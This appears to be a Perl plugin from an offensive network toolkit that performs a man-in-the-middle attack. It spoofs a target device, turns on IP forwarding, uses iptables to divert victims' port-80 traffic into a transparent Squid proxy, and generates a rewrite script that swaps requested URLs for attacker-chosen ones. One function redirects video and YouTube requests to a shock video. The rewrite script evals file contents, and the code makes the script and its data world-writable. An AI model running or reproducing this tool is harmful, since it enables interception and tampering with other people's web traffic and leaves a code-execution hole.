package Plugin::NetManipulator;
use warnings;
use Nemesis::Process;
my $VERSION = '0.1a';
my $AUTHOR  = "mudler";
my $MODULE  = "NetManipulator Module";
my $INFO    = "<www.dark-lab.net>";

#Public exported functions

my @PUBLIC_FUNCTIONS =
    qw(video_redirect restart start stop cud_regex);    #NECESSARY

sub new {                                               #NECESSARY
     #Usually new(), export_public_methods() and help() can be copyed from other plugins
    my $package = shift;
    bless( {}, $package );
    my (%Obj) = @_;
    %{ $package->{'core'} } = %Obj;

    #Here goes the required parameters to be passed

    die("IO and environment must be defined\n")
        if ( !defined( $package->{'core'}->{'IO'} )
        || !defined( $package->{'core'}->{'env'} ) );

    return $package;
}

sub export_public_methods() {    #NECESSARY
    my $self = shift;

    return @PUBLIC_FUNCTIONS;
}

sub help() {                     #NECESSARY
    my $self    = shift;
    my $IO      = $self->{'core'}->{'IO'};
    my $section = $_[0];
    $IO->print_title( $MODULE . " Helper" );
    if ( $section eq "configure" ) {
        $IO->print_title("nothing to configure here");
    }

}

sub clear() {
    my $self      = shift;
    my $env       = $self->{'core'}->{'env'};
    my $IO        = $self->{'core'}->{'IO'};
    my $workspace = $env->workspace();
    $IO->print_info("Restoring ip forward");
    $env->ipv4_forward("off");
    $IO->print_info("Flushing iptables");
    $IO->exec("iptables -F;iptables -F -t nat");
    my $process;

    if ( exists( $self->{'squidID'} ) ) {
        $IO->print_info("Stopping squid");
        $IO->debug( "exists " . $self->{'squidID'} );
        $process = new Nemesis::Process(
            env => $env,
            IO  => $IO,
            ID  => $self->{'squidID'}
        ) or $IO->print_alert("Can't reload id of squid");
        if ( $process->is_running() ) {
            $process->stop();
        }

    }
}

sub squid_generate_config {

    my $self      = shift;
    my $env       = $self->{'core'}->{'env'};
    my $IO        = $self->{'core'}->{'IO'};
    my $workspace = $env->workspace();
    open FILE, ">" . $env->tmp_dir() . "/squid.conf";
    print FILE "acl manager proto cache_object
acl localhost src 127.0.0.1/32 ::1
acl to_localhost dst 127.0.0.0/8 0.0.0.0/32 ::1
acl localnet src 10.0.0.0/8	# RFC1918 possible internal network
acl localnet src 172.16.0.0/12	# RFC1918 possible internal network
#acl localnet src 192.168.0.0/16 # RFC1918 possible internal network
acl localnet src 192.168.1.0/16 # RFC1918 possible internal network
acl localnet src fc00::/7       # RFC 4193 local private network range
acl localnet src fe80::/10      # RFC 4291 link-local (directly plugged) machines
acl SSL_ports port 443
acl Safe_ports port 80		# http
acl Safe_ports port 21		# ftp
acl Safe_ports port 443		# https
acl Safe_ports port 70		# gopher
acl Safe_ports port 210		# wais
acl Safe_ports port 1025-65535	# unregistered ports
acl Safe_ports port 280		# http-mgmt
acl Safe_ports port 488		# gss-http
acl Safe_ports port 591		# filemaker
acl Safe_ports port 777		# multiling http
acl Safe_ports port 901		# SWAT
acl CONNECT method CONNECT
http_access allow manager localhost
http_access deny manager
http_access deny !Safe_ports
http_access deny CONNECT !SSL_ports
http_access allow localnet
http_access allow localhost
http_access allow localhost
http_access deny all
http_port 3128 transparent
url_rewrite_program  " . $env->tmp_dir() . "/rewrite.pl\n";
    close FILE;
}

sub restart() {
    my $self      = shift;
    my $env       = $self->{'core'}->{'env'};
    my $IO        = $self->{'core'}->{'IO'};
    my $workspace = $env->workspace();
    $self->stop();
    $self->start();
}

sub start() {
    my $self = shift;

    my $env     = $self->{'core'}->{'env'};
    my $IO      = $self->{'core'}->{'IO'};
    my $modules = $self->{'core'}->{'ModuleLoader'}->{'modules'};

    if ( !defined( $_[0] ) ) {

        $IO->print_error('No device set, can\'t spoof');

    }
    else {

        if ( !exists( $self->{'squidID'} ) ) {
            $IO->print_info("Ip forward on");
            $env->ipv4_forward("on");
            $IO->exec("iptables -F;iptables -F -t nat");
            $IO->exec(
                "iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 3128"
            );

            $modules->{'Sniffer'}->spoof( $_[0] );

            $self->squid_generate_config();
            $self->generate_squid_program();
            $self->check_perms();
            $IO->print_info("Booting up squid");
            $code =
                  $env->whereis("squid")
                . ' -YC -f '
                . $env->tmp_dir()
                . '/squid.conf';
            $process = Nemesis::Process->new(
                type => 'daemon',                   # forked pipeline
                code => $code,
                env  => $self->{'core'}->{'env'},
                IO   => $IO,
            ) or $IO->print_alert("Can't start $code");

            $self->{'squidID'} = $process->start();

        }
        else {

            $IO->print_alert(
                "Squid already on, you can change pattern matching on the fly."
            );
            $IO->print_tabbed("You can also issue a restart");
        }
    }
}

sub stop()
{ #Cleared is mandatory, so using the same subroutine here for the public function exported as stop
    my $self = shift;
    $self->clear();
}

sub cud_regex() {    #Create update & delete
    my $self = shift;
    my $env  = $self->{'core'}->{'env'};
    my $IO   = $self->{'core'}->{'IO'};
    my ( $regex, $url ) = @_;
    open FILE, "<" . $env->tmp_dir() . "/regex.txt";
    my @REGEX_FILE = <FILE>;
    close FILE;
    my $action = 0;
    my $c      = 0;

    foreach my $r (@REGEX_FILE) {

        if ( $r =~ /$regex/i ) {    #se è stato trovato
            if ( defined($url) ) {    #se è definito url
                $action = 1;
                $r      = $regex . " => " . $url . "\n";
            }
            else {
                $action = 1;

                #se non è definito url viene eliminato.
                delete $REGEX_FILE[$c];

            }
        }
        $c++;

    }
    if ( $action == 0 && defined($url) ) {

        #deve essere pushato
        push( @REGEX_FILE, $regex . " => " . $url . "\n" );
    }
    open FILE, ">" . $env->tmp_dir() . "/regex.txt";
    print FILE @REGEX_FILE;
    close FILE;

}

sub video_redirect() {
    my $self      = shift;
    my $env       = $self->{'core'}->{'env'};
    my $IO        = $self->{'core'}->{'IO'};
    my $workspace = $env->workspace();
    $IO->print_info("Applying regex for video redirect...");
    $self->cud_regex( '\.flv',
        'http://www.videophenomena.com/files/2008/12/2-girls-1-cup.flv' );
    $self->cud_regex( 'watch|youtube',
        'http://www.youtube.com/watch?v=gRp_dUo5K1c' );
}

sub check_perms() {
    my $self = shift;
    my $env  = $self->{'core'}->{'env'};
    my $IO   = $self->{'core'}->{'IO'};
    $IO->exec( "chmod 777 " . $env->tmp_dir() . "/rewrite.pl" );
    $IO->exec( "chmod 777 " . $env->tmp_dir() . "/regex.txt" );
}

sub generate_squid_program {

    my $self = shift;
    my $env  = $self->{'core'}->{'env'};
    my $IO   = $self->{'core'}->{'IO'};
    $IO->print_info(
        "Placing the rewrite script in: " . $env->tmp_dir() . "/rewrite.pl" );

    open FILE, ">" . $env->tmp_dir() . "/rewrite.pl";
    print FILE '#!/usr/bin/perl
        $| = 1;
        while (<>) {
            chomp $_;
            $in = $_;
            open FILE, "<' . $env->tmp_dir() . "/regex.txt" . '";
            my $out;
            my $ev;
            foreach my $line ( @FILE = <FILE> ) {
                my ( $regex, $url ) = split( /\=\>/, $line );
                $regex =~ s/ //g;
                $url   =~ s/ //g;
                $ev=0;
                if($url=~/\$/){ $ev=1;}
                if ( $in =~ /$regex/i ) {
                                if($ev==1){eval( $out = eval($url));}
                                else { $out=$url; }
                }
            }
            close FILE;
            if ( !defined($out) ) {
                print $in. "\n";
            }
            else {
                print $out;
            }

        }
		';

    close FILE;

}

1;
__END__
